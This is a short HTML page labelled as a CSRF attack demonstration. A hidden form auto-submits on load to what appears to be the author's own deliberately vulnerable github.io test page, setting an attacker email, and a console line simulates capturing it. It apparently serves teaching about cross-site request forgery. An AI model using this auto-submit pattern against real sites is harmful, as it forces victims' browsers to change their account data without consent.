<html lang="en">

<body>
    <header>CSRF Attack Page</header>

        <h1>CSRF Attack Example</h1>
        <p>This page demonstrates a CSRF attack. The form below will automatically submit a request to the vulnerable page, and the email input will be logged to the console.</p>
        
        <!-- Form that performs the CSRF attack -->
        <form action="https://perse-22.github.io/test/csrfvuln.html" method="GET" style="display:none;">
            <input type="hidden" name="email" value="attacker@example.com">
        </form>

        <script>
            // Automatically submit the CSRF form
            document.forms[0].submit();

            // Simulate capturing and logging the result
            const emailInput = "attacker@example.com"; // Simulated email value
            console.log(`Captured Email Input: ${emailInput}`);
        </script>
